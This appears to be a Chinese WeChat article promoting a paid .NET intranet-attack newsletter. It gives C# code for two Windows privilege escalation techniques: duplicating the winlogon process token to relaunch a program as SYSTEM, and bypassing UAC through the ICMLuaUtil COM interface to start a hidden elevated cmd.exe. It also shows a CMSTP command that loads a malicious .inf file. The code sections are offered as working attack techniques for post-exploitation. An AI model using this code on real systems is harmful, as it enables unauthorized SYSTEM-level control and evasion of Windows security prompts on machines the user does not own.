---
title: .NET内网实战：通过winlogon、CMSTP提升本地账户权限
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247498840&idx=1&sn=77d51a59d3cf75aa131a876a2692776d&chksm=fa5952b5cd2edba334596c7d8a89a1c12e8345124572eefae4410022b000563bc499d5d216af&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2025-02-10
fetch_date: 2025-10-06T20:37:00.395216
---

# .NET内网实战：通过winlogon、CMSTP提升本地账户权限

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YicIKahovrXu04WE1Fib7PAg2T8fd3WpTHbS0LrSGdCxvIhxOzkaicD1BNwhB7QKoKPQuEzraREVbW9A/0?wx_fmt=jpeg)

# .NET内网实战：通过winlogon、CMSTP提升本地账户权限

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所节选自小报童《.NET 内网实战攻防》专栏，主要内容有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，对内网和后渗透感兴趣的朋友们可以订阅该电子报刊，解锁更多的报刊内容。

02

本地权限提升

本文内容部分节选自小报童《.NET 通过winlogon进程提升至SYSTEM权限》和 《.NET 通过指定的COM接口执行命令绕过UAC》，完整的文章内容请加入小报童后订阅查看。现在限时只需59元，永久买断！目前已有280+位朋友抢先预定，我们会长期更新，对.NET内网安全的朋友们请尽快订阅该报刊！

![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8CWeefbBgyW3zAxvXhXHkrF0bZthKsMUbCJkZFTKxg3hXwCsS4o02AkUIhpSXbVqBblfefFLehzw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicGzMlYWH7wZdGaEvj0gb5l2OU42w0aAMyvibXOz6GabXcpwKoFFpliagYfRWg58Jfbun9zicbNBexoQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

03

Winlogon权限提升

在内网渗透环境中，获得 SYSTEM 权限是攻击链中的关键一环。通过分析 Windows 系统中对高权限进程的访问机制，我们利用 SYSTEM 账户运行的winlogo进程的访问令牌，可以伪装为操作系统内核，启动具有最高权限的进程。

## 3.1 识别当前进程的所有者

我们调用 WMI 的 GetOwner 方法反射获取进程所有者的用户名和所在的域，然后通过判断进程所有者的用户名是否包含了关键词 "NT"，比如返回 "NT AUTHORITY\SYSTEM"，包含了NT就表示该进程是系统用户创建的，因此也具备了SYSTEM权限。具体代码如下所示。

```
```
public static string GetProcessOwner(int processId)
{
			string query = "Select * From Win32_Process Where ProcessID = " + processId.ToString();
			ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
			ManagementObjectCollection processList = searcher.Get();
			foreach (ManagementBaseObject managementBaseObject in processList)
			{
				ManagementObject obj = (ManagementObject)managementBaseObject;
				string[] argList = new string[]
				{
					string.Empty,
					string.Empty
				};
				ManagementObject managementObject = obj;
				string methodName = "GetOwner";
				object[] args = argList;
				int returnVal = Convert.ToInt32(managementObject.InvokeMethod(methodName, args));
				bool flag = returnVal == 0;
				if (flag)
				{
					return argList[1] + "\\" + argList[0];
				}
			}
			return "NO OWNER";
}
```
```

首先，通过 Process.GetCurrentProcess().Id 获取当前运行的进程的PID，接着，调用上述的 GetProcessOwner 方法，通过传递当前进程的 ID，获取进程的所有者信息，再通过反射调用GetOwner方法，获取进程所有者的用户名和所在的域。如果 GetOwner 调用成功，返回字符串格式为 当前计算机域\用户名。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8CWeefbBgyW3zAxvXhXHkr7KQZbX657eLy242htwYIemB6tyVnLp6xc78iaibjYOM2TDU4YXbPSHLw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这里，使用 OpenProcessToken 函数打开 winlogon 进程的访问令牌，并将令牌句柄存储在 tokenHandle 中。紧接着，使用 DuplicateTokenEx 函数创建一个新的令牌，并且指定 TokenPrimary 为主令牌，代码如下所示。

```
```
IntPtr doubleDuplicateToken = IntPtr.Zero;
WinApi.DuplicateTokenEx(tokenHandle, 33554432U, ref SECA, 2, WinApi.TOKEN_TYPE.TokenPrimary, out doubleDuplicateToken);
```
```

最后，使用 CreateProcessWithTokenW 函数启动一个进程，核心代码如下所示。

```
```
WinApi.CreateProcessWithTokenW(
    doubleDuplicateToken,
    WinApi.LogonFlags.NetCredentialsOnly,
    null,
    procTostart,
    WinApi.CreationFlags.DefaultErrorMode,
    IntPtr.Zero,
    null,
    ref SINFO,
    out PINFO);
```
```

创建新的进程中，procTostart 变量是当前程序的路径，用于重新启动自身，doubleDuplicateToken 表示 SYSTEM 权限的令牌，这样重启后的进程权限是SYSTEM，并且进程的所有者变成NT系统用户。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8CWeefbBgyW3zAxvXhXHkrzjeQTVXgOOGUug2bX4EDYAia3L097XXVEuTUH1KbbIGwax8icfLr9L4A/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

综上，通过获取 Winlogon 进程的令牌来完成权限提升的方法，核心思想是利用 SYSTEM 权限的令牌启动一个新的进程，从而将当前程序提升到 SYSTEM 权限，为渗透测试或本地权限提升提供了极大的便利。想要了解完整或者更多的内网安全方向的文章，可以移步订阅小报童《.NET 内网实战攻防》电子报刊。

04

CMSTP权限提升

在Windows操作系统中，UAC（用户帐户控制）机制用于防止未经授权的程序以管理员权限执行操作，从而增加系统安全性。渗透测试人员利用 ICMLuaUtil 接口的 ShellExec 方法，结合 COM 接口创建具有提升权限的 COM 对象，可以在不触发 UAC 弹窗的情况下启动具有管理员权限的进程。

## 4.1 CMSTP

CMSTP.exe 是 Windows 系统中的一个命令行工具，全称是 Connection Manager Profile Installer。通常，运行 CMSTP 并安装指定配置文件的命令格式如下所示。

```
CMSTP.exe "C:\VPNProfile.inf"
```

此命令将在用户系统中安装 VPNProfile.inf 配置文件的内容。然而，攻击者常常会利用此工具加载恶意的 .inf 文件，具体命令如下所示

```
CMSTP.exe /s "C:\path\to\malicious.inf"
```

CMSTPLUA 是 Windows 系统的一个组件，专门用于在 CMSTP.exe 程序运行时管理用户权限请求，以管理员身份运行后，在 Registry 中打开 CLSIDs，输入 “cmstplua” 进行搜索，即可快速定位到该组件，如下图所示

![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicGzMlYWH7wZdGaEvj0gb5lNxIBbic0fCEfZicJTHOr3pr0KLTo0tOibyRQwdxykffcS8aeo6j201h7Q/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

双击查看反汇编代码后，可以发现 ShellExec 函数，通过调用 Windows API ShellExecuteExW 来实现命令执行。

## 4.2 编码实现

我们的主要思路是利用 Windows COM 组件中的 ICMLuaUtil 接口，通过自定义的 LaunchElevatedCOMObject 方法来提升权限并执行 cmd.exe，在这里，我们使用的 GUID 指向 Windows 的 ICMLuaUtil 接口

```
```
Guid clsid = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
Guid interfaceID = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
```
```

接着，自定义的 LaunchElevatedCOMObject 方法通过 CoGetObject 函数创建一个以管理员权限运行的 COM 对象实例，并返回一个 ICMLuaUtil 接口的实例

```
```
public static object LaunchElevatedCOMObject(Guid Clsid, Guid InterfaceID)
{
			string str = Clsid.ToString("B");
			string pszName = "Elevation:Administrator!new:" + str;
			BypassUAC_csharp.BIND_OPTS3 bind_OPTS = default(BypassUAC_csharp.BIND_OPTS3);
			bind_OPTS.cbStruct = (uint)Marshal.SizeOf(bind_OPTS);
			bind_OPTS.hwnd = IntPtr.Zero;
			bind_OPTS.dwClassContext = 4U;
			return BypassUAC_csharp.CoGetObject(pszName, ref bind_OPTS, InterfaceID);
}
```
```

最后，通过 icmluaUtil.ShellExec 方法，以管理员权限启动 cmd.exe，这里传入的参数依次为程序路径、命令参数、工作目录、nShowCmd 值（0 表示窗口不显示），具体代码如下所示。

```
```
icmluaUtil.ShellExec("C:\\windows\\system32\\cmd.exe", null, null, 0UL, 5UL);
```
```

在 Windows 64位操作系统上启动后，直接提升到管理员权限并启动一个新的高权限命令行窗口 cmd.exe，输入命令：whoami /priv，返回的账户特权信息符合预期，如下图所示。

![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicGzMlYWH7wZdGaEvj0gb5lusThVoZY9Qx8vmPUILzibGBQj3cJmSlsLhlTmN9R2XyQ9hDchXhrz0g/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

综上，ICMLuaUtil 作为 Windows 系统组件，原本期望用于管理具有管理员权限的进程启动。但攻防实战中通过调用 ShellExec 方法，结合 LaunchElevatedCOMObject 创建具有提升权限的 ICMLuaUtil 实例，就可以绕过 UAC，直接执行具有管理员权限的命令。想要了解完整或者更多的内网安全防御绕过方向的文章，可以移步订阅小报童《.NET 内网实战攻防》电子报刊。

05

**欢迎加入.NET 电子报刊**

我们的小报童电子报刊【.NET内网安全攻防】也开始运营，引入小报童也是为了弥补知识星球对于轻量级阅读支持的不足，为用户读者提供更佳的阅读体验。如果您对阅读体验的需求比较高，那么可以订阅这个专栏。

本次电子报刊《.NET 内网安全攻防》专栏，内容主要有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，可细分为以下8个方向。

```
1） .NET 安全防御绕过
2） .NET 本地权限提升
3） .NET 内网信息收集
4） .NET 内网代理通道
5） .NET 内网横向移动
6） .NET 目标权限维持
7） .NET 数据传输外发
8） .NET 目标痕迹清理
```

原价899，现在限时只需59元，永久买断！目前已有240+位朋友抢先预定，我们会长期更新，初步计划保持每周更新1-2篇新内容，对.NET内网安全的朋友们请尽快订阅该报刊！![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibeicvDNVldcXTgRnFUFTwOqfTleogJThU7kCaZJuuU2BLVLYluu6CFV7BX458AxBcd93ickZ0rmOqQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

每增加五十人涨价10元，抓紧订阅，超值！订阅后请关注公众号：dotNet安全矩阵，发送订单截图和您的微信号，邀请您加入专属交流群。感兴趣的朋友，可以点击链接：https://xiaobot.net/p/dotNetAttack，或者扫描下方海报微信二维码加入即可，订阅后小报童定时会将最新内容通过微信推送给您。

![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibXibiaRyFPI439dFybReKxQoa5OnhetdDKdnd36lG844cFIWNaib1adpRCXOJbRb6mVicfic8tLqXl9Pw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

dotNet安全矩阵

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过